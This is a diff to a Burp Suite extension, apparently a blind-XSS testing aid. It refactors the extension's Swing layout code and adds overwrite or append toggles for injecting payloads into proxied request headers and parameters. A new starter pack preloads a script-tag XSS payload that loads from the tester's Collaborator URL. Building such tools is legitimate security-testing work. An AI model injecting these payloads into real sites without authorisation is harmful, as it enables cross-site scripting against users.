@@ -74,6 +74,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     _jTextFieldAdditionalCmdLine = None
     _jButtonSetCommandLine = None
     _jLabelAbout = None
+    _overwriteHeader = False
+    _overwriteParam = False
+
 
     #
     # implement IBurpExtender
@@ -101,42 +104,18 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
         self._jPanel.setBounds(0, 0, 1000, 1000)
         self._jLabelTechniques = JLabel("Your URL (my.burpcollaborator.net):")
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 0
-        self._jPanelConstraints.gridy = 1
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 10, 0)
-        self._jPanel.add(self._jLabelTechniques, self._jPanelConstraints)
+        self.createAnyView(self._jLabelTechniques, 0, 1, 2, 1, Insets(0, 0, 10, 0))
 
         self._jTextFieldURL = JTextField("", 30)
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 2
-        self._jPanelConstraints.gridy = 1
-        self._jPanelConstraints.gridwidth = 4
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 10, 0)
-        self._jPanel.add(self._jTextFieldURL, self._jPanelConstraints)
+        self.createAnyView(self._jTextFieldURL, 2, 1, 6, 1, Insets(0, 0, 10, 0))
+
 
         self._jLabelTechniques = JLabel("Press to start:")
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.anchor = GridBagConstraints.WEST
-        self._jPanelConstraints.gridx = 0
-        self._jPanelConstraints.gridy = 0
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 10, 0)
-        self._jPanel.add(self._jLabelTechniques, self._jPanelConstraints)
+        self.createAnyView(self._jLabelTechniques, 0, 0, 2, 1, Insets(0, 0, 10, 0))
 
         self.submitSearchButton = swing.JButton(self.start_button_text, actionPerformed=self.active_flag)
         self.submitSearchButton.setBackground(Color.WHITE)
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 2
-        self._jPanelConstraints.gridy = 0
-        self._jPanelConstraints.gridwidth = 4
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 10, 0)
-        self._jPanel.add(self.submitSearchButton, self._jPanelConstraints)
+        self.createAnyView(self.submitSearchButton, 2, 0, 6, 1, Insets(0, 0, 10, 0))
 
 
         self._tableModelPayloads = DefaultTableModel() 
@@ -157,131 +136,69 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 1))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 0
-        self._jPanelConstraints.gridy = 2
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 0, 10)
-        self._jPanel.add(self._scrolltable, self._jPanelConstraints)
+        self.createAnyView(self._scrolltable, 0, 2, 2, 1, Insets(0, 0, 0, 10))
+
 
         self._table = JTable(self._tableModelHeaders)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 2))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 2
-        self._jPanelConstraints.gridy = 2
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 0, 10)
-        self._jPanel.add(self._scrolltable, self._jPanelConstraints)
+        self.createAnyView(self._scrolltable, 2, 2, 3, 1, Insets(0, 0, 0, 10))
+
 
         self._table = JTable(self._tableModelParams)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 3))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 4
-        self._jPanelConstraints.gridy = 2
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(0, 0, 0, 0)
-        self._jPanel.add(self._scrolltable, self._jPanelConstraints)
+        self.createAnyView(self._scrolltable, 5, 2, 3, 1, Insets(0, 0, 0, 0))
 
-
-        addPayloadButton = swing.JButton('Add',actionPerformed=self.addToPayload)
-        addPayloadButton.setBackground(Color.WHITE)
-        addPayloadButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        # self._jPanelConstraints.anchor = GridBagConstraints.CENTER
-        self._jPanelConstraints.gridx = 1
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 10)
-        self._jPanel.add(addPayloadButton, self._jPanelConstraints)
 
         deletePayloadButton = swing.JButton('Delete',actionPerformed=self.deleteToPayload)
         deletePayloadButton.setBackground(Color.WHITE)
-        deletePayloadButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 0
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 0)
-        self._jPanel.add(deletePayloadButton, self._jPanelConstraints)
+        self.createAnyView(deletePayloadButton, 0, 3, 1, 1, Insets(3, 0, 0, 0))
 
-        addHeaderButton = swing.JButton('Add',actionPerformed=self.addToHeader)
-        addHeaderButton.setBackground(Color.WHITE)
-        addHeaderButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        # self._jPanelConstraints.anchor = GridBagConstraints.CENTER
-        self._jPanelConstraints.gridx = 3
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 10)
-        self._jPanel.add(addHeaderButton, self._jPanelConstraints)
+        addPayloadButton = swing.JButton('Add',actionPerformed=self.addToPayload)
+        addPayloadButton.setBackground(Color.WHITE)
+        self.createAnyView(addPayloadButton, 1, 3, 1, 1, Insets(3, 0, 0, 10))
+
 
         deleteHeaderButton = swing.JButton('Delete',actionPerformed=self.deleteToHeader)
         deleteHeaderButton.setBackground(Color.WHITE)
-        deleteHeaderButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 2
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 0)
-        self._jPanel.add(deleteHeaderButton, self._jPanelConstraints)
+        self.createAnyView(deleteHeaderButton, 2, 3, 1, 1, Insets(3, 0, 0, 0))
 
-        addParamsButton = swing.JButton('Add',actionPerformed=self.addToParams)
-        addParamsButton.setBackground(Color.WHITE)
-        addParamsButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        # self._jPanelConstraints.anchor = GridBagConstraints.CENTER
-        self._jPanelConstraints.gridx = 5
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 0)
-        self._jPanel.add(addParamsButton, self._jPanelConstraints)
+        self._overwriteHeaderButton = swing.JButton('Overwrite',actionPerformed=self.overwriteHeader)
+        self._overwriteHeaderButton.setBackground(Color.WHITE)
+        self.createAnyView(self._overwriteHeaderButton, 3, 3, 1, 1, Insets(3, 0, 0, 0))
+
+        addHeaderButton = swing.JButton('Add',actionPerformed=self.addToHeader)
+        addHeaderButton.setBackground(Color.WHITE)
+        self.createAnyView(addHeaderButton, 4, 3, 1, 1, Insets(3, 0, 0, 10))
+
 
         deleteParamsButton = swing.JButton('Delete',actionPerformed=self.deleteToParams)
         deleteParamsButton.setBackground(Color.WHITE)
-        deleteParamsButton.setPreferredSize(Dimension(150, 40))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 4
-        self._jPanelConstraints.gridy = 3
-        self._jPanelConstraints.gridwidth = 1
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 0)
-        self._jPanel.add(deleteParamsButton, self._jPanelConstraints)
+        self.createAnyView(deleteParamsButton, 5, 3, 1, 1, Insets(3, 0, 0, 0))
+
+        self._overwriteParamButton = swing.JButton('Overwrite',actionPerformed=self.overwriteParam)
+        self._overwriteParamButton.setBackground(Color.WHITE)
+        self.createAnyView(self._overwriteParamButton, 6, 3, 1, 1, Insets(3, 0, 0, 0))
+
+        addParamsButton = swing.JButton('Add',actionPerformed=self.addToParams)
+        addParamsButton.setBackground(Color.WHITE)
+        self.createAnyView(addParamsButton, 7, 3, 1, 1, Insets(3, 0, 0, 0))
         
 
         self._resultsTextArea = swing.JTextArea()
         resultsOutput = swing.JScrollPane(self._resultsTextArea)
         resultsOutput.setMinimumSize(Dimension(800,200))
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        self._jPanelConstraints.gridx = 0
-        self._jPanelConstraints.gridy = 4
-        self._jPanelConstraints.gridwidth = 6
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(10, 0, 0, 0)
-        self._jPanel.add(resultsOutput, self._jPanelConstraints)
+        self.createAnyView(resultsOutput, 0, 4, 8, 1, Insets(10, 0, 0, 0))
+
 
         self.clearSearchButton = swing.JButton('Clear Search Output',actionPerformed=self.clearOutput)
-        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
-        # self._jPanelConstraints.anchor = GridBagConstraints.CENTER
-        self._jPanelConstraints.gridx = 2
-        self._jPanelConstraints.gridy = 5
-        self._jPanelConstraints.gridwidth = 2
-        self._jPanelConstraints.gridheight = 1
-        self._jPanelConstraints.insets = Insets(3, 0, 0, 0)
-        self._jPanel.add(self.clearSearchButton, self._jPanelConstraints)
+        self.createAnyView(self.clearSearchButton, 2, 5, 3, 1, Insets(3, 0, 0, 0))
+
 
         self._callbacks.customizeUiComponent(self._jPanel)
 
@@ -289,32 +206,29 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         # register ourselves as an HTTP listener
         self._callbacks.registerHttpListener(self)
 
+        self.starterPack()
+
         return
 
 
-    # def onCheck(self, event):
-    #     if self._checkBoxPayload.isSelected() and self.table_flag != 0:
-    #         self.table_flag = 0
-    #         self._checkBoxHeader.setSelected(False)
-    #         self._checkBoxParam.setSelected(False)
+    def createAnyView(self, _component, gridx, gridy, gridwidth, gridheight, insets):
+        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
+        self._jPanelConstraints.gridx = gridx
+        self._jPanelConstraints.gridy = gridy
+        self._jPanelConstraints.gridwidth = gridwidth
+        self._jPanelConstraints.gridheight = gridheight
+        self._jPanelConstraints.insets = insets
+        self._jPanel.add(_component, self._jPanelConstraints)
 
 
-    #     if self._checkBoxHeader.isSelected() and self.table_flag != 1:
-    #         self.table_flag = 1
-    #         self._checkBoxParam.setSelected(False)
-    #         self._checkBoxPayload.setSelected(False)
-
-
-    #     if self._checkBoxParam.isSelected() and self.table_flag != 2:
-    #         self.table_flag = 2
-    #         self._checkBoxHeader.setSelected(False)
-    #         self._checkBoxPayload.setSelected(False)
-
+    def starterPack(self):
+        self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), [r'"><script src=${URL}$></script>', '1'])
+        self._tableModelHeaders.insertRow(self._tableModelHeaders.getRowCount(), ['User-agent', '1'])
+        self._tableModelParams.insertRow(self._tableModelParams.getRowCount(), ['test', '1'])
 
     # run Query for Add to Queue Button
     def addToPayload(self, button):
         self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), ['', ''])
-        # self.appendToResults(str(self._tableModelPayloads.getDataVector()))
 
     def addToHeader(self, button):
         self._tableModelHeaders.insertRow(self._tableModelHeaders.getRowCount(), ['', ''])
@@ -324,48 +238,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def deleteToPayload(self, button):
         self._tableModelPayloads.removeRow(self._tableModelPayloads.getRowCount()-1)
-        # self.appendToResults(str(self._tableModelPayloads.getDataVector()))
 
     def deleteToHeader(self, button):
         self._tableModelHeaders.removeRow(self._tableModelHeaders.getRowCount()-1)
-        # self.appendToResults(str(self._tableModelHeaders.getDataVector()))
 
     def deleteToParams(self, button):
         self._tableModelParams.removeRow(self._tableModelParams.getRowCount()-1)
-        # self.appendToResults(str(self._tableModelParams.getDataVector()))
-
-
-    # Clear Queue Function
-    def clearQueue(self, button):
-        table_number = self.table_flag
-
-        if table_number == 0:
-            data = self._tableModelPayloads.getDataVector()
-            try:
-                self._dictPayloads.pop(data[-1][0])
-            except Exception:
-                pass
-            self._tableModelPayloads.removeRow(self._tableModelPayloads.getRowCount()-1)
-        elif table_number == 1:
-            data = self._tableModelHeaders.getDataVector()
-            try:
-                self._dictHeaders.pop(data[-1][0])
-            except Exception:
-                pass
-            self._tableModelHeaders.removeRow(self._tableModelHeaders.getRowCount()-1)
-        elif table_number == 2:
-            data = self._tableModelParams.getDataVector()
-            try:
-                self._dictParams.pop(data[-1][0])
-            except Exception:
-                pass
-            self._tableModelParams.removeRow(self._tableModelParams.getRowCount()-1)
-
-
-    def updateTables(self, button):
-        self._dictPayloads = {x[0]:x[1] for x in self._tableModelPayloads.getDataVector()}
-        self._dictHeaders = {x[0]:x[1] for x in self._tableModelHeaders.getDataVector()}
-        self._dictParams = {x[0]:x[1] for x in self._tableModelParams.getDataVector()}
 
 
     # Clear GUI Output Function
@@ -392,6 +270,24 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.submitSearchButton.setBackground(Color.WHITE)
             self.appendToResults("Proxy stop...")
 
+    def overwriteHeader(self, button):
+        if not self._overwriteHeader:
+            self._overwriteHeader = True
+            self._overwriteHeaderButton.setBackground(Color.GRAY)
+
+        elif self._overwriteHeader:
+            self._overwriteHeader = False
+            self._overwriteHeaderButton.setBackground(Color.WHITE)
+
+    def overwriteParam(self, button):
+        if not self._overwriteParam:
+            self._overwriteParam = True
+            self._overwriteParamButton.setBackground(Color.GRAY)
+
+        elif self._overwriteParam:
+            self._overwriteParam = False
+            self._overwriteParamButton.setBackground(Color.WHITE)
+
 
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
         try:
@@ -411,10 +307,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key.lower() in dictRealHeaders.keys():
                     if len(self._dictPayloads.keys()) == 0:
                         pass
-                    else:
+                    elif self._overwriteHeader:
                         payload = random.choice(self._dictPayloads.keys())
-                        # payload = payload.replace("$HEADER$", self._jTextFieldURL.text, 1)
-                        payload = payload.replace("$URL$", self._jTextFieldURL.text, 1)
+                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
+                        requestString = requestString.replace(dictRealHeaders.get(key.lower()), payload, 1)
+                    elif not self._overwriteHeader:
+                        payload = random.choice(self._dictPayloads.keys())
+                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
+                        payload = dictRealHeaders.get(key.lower()) + payload
                         requestString = requestString.replace(dictRealHeaders.get(key.lower()), payload, 1)
                 else:
                     pass
@@ -426,10 +326,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key.lower() in dictRealParams.keys():
                     if len(self._dictPayloads.keys()) == 0:
                         pass
-                    else:
+                    elif self._overwriteParam:
                         payload = random.choice(self._dictPayloads.keys())
-                        # payload = payload.replace("$PARAM$", self._jTextFieldURL.text, 1)
-                        payload = payload.replace("$URL$", self._jTextFieldURL.text, 1)
+                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
+                        url[0] = url[0].replace(dictRealParams.get(key.lower()), payload, 1)
+                    elif not self._overwriteParam:
+                        payload = random.choice(self._dictPayloads.keys())
+                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
+                        payload = dictRealParams.get(key.lower()) + payload
                         url[0] = url[0].replace(dictRealParams.get(key.lower()), payload, 1)
                 else:
                     pass
